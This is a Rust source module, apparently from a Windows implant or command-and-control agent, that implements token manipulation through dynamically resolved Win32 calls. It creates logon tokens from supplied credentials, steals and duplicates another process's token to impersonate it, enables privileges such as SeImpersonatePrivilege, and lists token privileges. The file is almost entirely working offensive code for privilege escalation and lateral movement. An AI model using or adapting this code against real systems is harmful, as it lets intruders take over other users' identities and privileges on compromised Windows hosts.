use core::{
    ffi::c_void, ptr::{null, null_mut}
};

use alloc::{string::String, vec::Vec};

use crate::{
    get_instance, libs::advapi::TOKEN_PRIVILEGES
};

pub struct Privilege {
    pub name: String,
    pub enabled: bool,
}
impl Privilege {
    pub fn new() -> Self {
        Privilege {
            name: String::from("unknown"),
            enabled: false,
        }
    }
}

/// Helper: capture GetLastError and return it as Err(u32)
unsafe fn last_err() -> u32 {
    (get_instance().unwrap().k32.get_last_error)()
}

pub fn make_token(
    domain: &str,
    username: &str,
    password: &str,
    logon_type: Option<u32>,
) -> Result<(), u32> {
    let domain_w: Vec<u16> = domain.encode_utf16().chain(Some(0)).collect();
    let username_w: Vec<u16> = username.encode_utf16().chain(Some(0)).collect();
    let password_w: Vec<u16> = password.encode_utf16().chain(Some(0)).collect();

    let mut logon_type_arg = 9; //LOGON32_LOGON_NEW_CREDENTIALS
    let mut logon_provider: u32 = 3; //LOGON32_PROVIDER_WINNT50

    if logon_type.is_some() {
        logon_type_arg = logon_type.unwrap();
    }
    if logon_type_arg != 9 {
        logon_provider = 0;
        // Only need SeImpersonatePrivilege for non-netonly logons
        enable_process_privilege("SeImpersonatePrivilege")?;
    }

    let mut token: *mut c_void = null_mut();
    if !unsafe {
        (get_instance().unwrap().advapi.logon_user_w)(
            username_w.as_ptr(),
            domain_w.as_ptr(),
            password_w.as_ptr(),
            logon_type_arg,
            logon_provider,
            &mut token,
        )
    } {
        return Err(unsafe { last_err() });
    }

    if !unsafe { (get_instance().unwrap().advapi.impersonate_logged_on_user)(token) } {
        return Err(unsafe { last_err() });
    }

    Ok(())
}

pub fn impersonate_process(pid: u32) -> Result<(), u32> {
    let h_proc = unsafe { (get_instance().unwrap().k32.open_process)(0x400, false, pid) };
    if h_proc.is_null() {
        return Err(unsafe { last_err() });
    }

    let mut h_token = null_mut();
    if !unsafe {
        (get_instance().unwrap().advapi.open_process_token)(h_proc, 2 | 1 | 8, &mut h_token)
    } {
        unsafe { (get_instance().unwrap().k32.close_handle)(h_proc) };
        return Err(unsafe { last_err() });
    }

    if !unsafe { (get_instance().unwrap().advapi.impersonate_logged_on_user)(h_token) } {
        unsafe { (get_instance().unwrap().k32.close_handle)(h_proc) };
        unsafe { (get_instance().unwrap().k32.close_handle)(h_token) };
        return Err(unsafe { last_err() });
    }

    let mut new_token: *mut c_void = null_mut();
    if !unsafe {
        (get_instance().unwrap().advapi.duplicate_token_ex)(
            h_token,
            0xF01FF,
            null_mut(),
            3,
            2,
            &mut new_token,
        )
    } {
        return Err(unsafe { last_err() });
    }

    if !unsafe {
        (get_instance().unwrap().advapi.set_thread_token)(
            (get_instance().unwrap().k32.get_current_thread)(),
            new_token,
        )
    } {
        return Err(unsafe { last_err() });
    }

    Ok(())
}

pub fn enable_process_privilege(priv_name: &str) -> Result<(), u32> {
    let mut h_token: *mut c_void = null_mut();
    let h_process = unsafe { (get_instance().unwrap().k32.get_current_process)() };
    if !unsafe {
        (get_instance().unwrap().advapi.open_process_token)(h_process, 0x20 | 8, &mut h_token)
    } {
        return Err(unsafe { last_err() });
    }
    unsafe { (get_instance().unwrap().k32.close_handle)(h_process) };
    enable_privilege(h_token, priv_name)
}

pub fn enable_privilege_by_pid(pid: u32, priv_name: &str) -> Result<(), u32> {
    let h_proc = unsafe { (get_instance().unwrap().k32.open_process)(0x0400, false, pid) };
    if h_proc.is_null() {
        return Err(unsafe { last_err() });
    }

    let mut h_token: *mut c_void = null_mut();
    if !unsafe {
        (get_instance().unwrap().advapi.open_process_token)(h_proc, 0x20 | 8, &mut h_token)
    } {
        unsafe { (get_instance().unwrap().k32.close_handle)(h_proc) };
        return Err(unsafe { last_err() });
    }
    unsafe { (get_instance().unwrap().k32.close_handle)(h_proc) };
    enable_privilege(h_token, priv_name)
}

pub fn enable_privilege(h_token: *mut c_void, priv_name: &str) -> Result<(), u32> {
    let mut priv_name_w: Vec<u16> = priv_name.encode_utf16().chain(Some(0)).collect();

    let mut token_privs: TOKEN_PRIVILEGES = unsafe { core::mem::zeroed() };

    if !unsafe {
        (get_instance().unwrap().advapi.lookup_privilege_value_w)(
            null(),
            priv_name_w.as_mut_ptr(),
            &mut token_privs.Privileges[0].Luid,
        )
    } {
        unsafe { (get_instance().unwrap().k32.close_handle)(h_token) };
        return Err(unsafe { last_err() });
    }

    token_privs.PrivilegeCount = 1;
    token_privs.Privileges[0].Attributes = 2; //SE_PRIVILEGE_ENABLED

    if !unsafe {
        (get_instance().unwrap().advapi.adjust_token_privileges)(
            h_token,
            false,
            &mut token_privs,
            0,
            null_mut(),
            null_mut(),
        )
    } {
        unsafe { (get_instance().unwrap().k32.close_handle)(h_token) };
        return Err(unsafe { last_err() });
    }

    // ERROR_NOT_ALL_ASSIGNED — token does not have this privilege
    let le = unsafe { last_err() };
    if le == 0x514 {
        unsafe { (get_instance().unwrap().k32.close_handle)(h_token) };
        return Err(le);
    }

    unsafe { (get_instance().unwrap().k32.close_handle)(h_token) };
    Ok(())
}

pub fn list_process_privs(pid: Option<u32>) -> Result<Vec<Privilege>, u32> {
    let h_proc = if let Some(pid) = pid {
        unsafe { (get_instance().unwrap().k32.open_process)(0x0400, false, pid) }
    } else {
        unsafe { (get_instance().unwrap().k32.get_current_process)() }
    };

    if h_proc.is_null() {
        return Err(unsafe { last_err() });
    }

    let mut token_handle = null_mut();
    if !unsafe {
        (get_instance().unwrap().advapi.open_process_token)(h_proc, 0x08, &mut token_handle)
    }
    {
        unsafe { (get_instance().unwrap().k32.close_handle)(h_proc) };
        return Err(unsafe { last_err() });
    }

    unsafe { (get_instance().unwrap().k32.close_handle)(h_proc) };
    list_privs(token_handle)
}

pub fn list_current_thread_privs() -> Result<Vec<Privilege>, u32> {
    let h_thread = unsafe { (get_instance().unwrap().k32.get_current_thread)() };
    let mut h_token = null_mut();
    if !unsafe {
        (get_instance().unwrap().advapi.open_thread_token)(h_thread, 0x08, false, &mut h_token)
    }
    {
        return Err(unsafe { last_err() });
    }

    unsafe { (get_instance().unwrap().k32.close_handle)(h_thread) };
    list_privs(h_token)
}

pub fn list_privs(h_token: *mut c_void) -> Result<Vec<Privilege>, u32> {
    let mut buffer_size: u32 = 0;
    let mut privs: Vec<Privilege> = Vec::new();
    unsafe {
        (get_instance().unwrap().advapi.get_token_information)(
            h_token,
            3, // TokenPrivileges
            core::ptr::null_mut(),
            0,
            &mut buffer_size,
        )
    };

    let mut privileges_buffer: Vec<u8> = Vec::with_capacity(buffer_size as usize);
    if !unsafe {
        (get_instance().unwrap().advapi.get_token_information)(
            h_token,
            3,
            privileges_buffer.as_mut_ptr() as *mut c_void,
            buffer_size,
            &mut buffer_size,
        )
    }
    {
        return Err(unsafe { last_err() });
    }

    let privileges = unsafe { &*(privileges_buffer.as_ptr() as *const TOKEN_PRIVILEGES) };
    let privilege_list = unsafe {
        core::slice::from_raw_parts(
            privileges.Privileges.as_ptr(),
            privileges.PrivilegeCount as usize,
        )
    };

    for privilege in privilege_list {
        let mut privobj: Privilege = Privilege::new();
        let mut name_size: u32 = 0;
        unsafe {
            (get_instance().unwrap().advapi.lookup_privilege_name_w)(
                core::ptr::null(),
                &privilege.Luid,
                core::ptr::null_mut(),
                &mut name_size,
            )
        };
        let mut name_buffer: Vec<u16> = Vec::with_capacity(name_size as usize);
        if unsafe {
            (get_instance().unwrap().advapi.lookup_privilege_name_w)(
                null(),
                &privilege.Luid,
                name_buffer.as_mut_ptr(),
                &mut name_size,
            )
        }
        {
            unsafe { name_buffer.set_len(name_size as usize) };
            privobj.name = String::from_utf16_lossy(&name_buffer);
        }

        if privilege.Attributes & 2 == 2 {
            privobj.enabled = true;
        }

        privs.push(privobj)
    }

    unsafe { (get_instance().unwrap().k32.close_handle)(h_token) };

    Ok(privs)
}

pub fn revert_to_self() -> Result<(), u32> {
    let result = unsafe { (get_instance().unwrap().advapi.revert_to_self)() };
    if result == 0 {
        return Err(unsafe { last_err() });
    }
    Ok(())
}
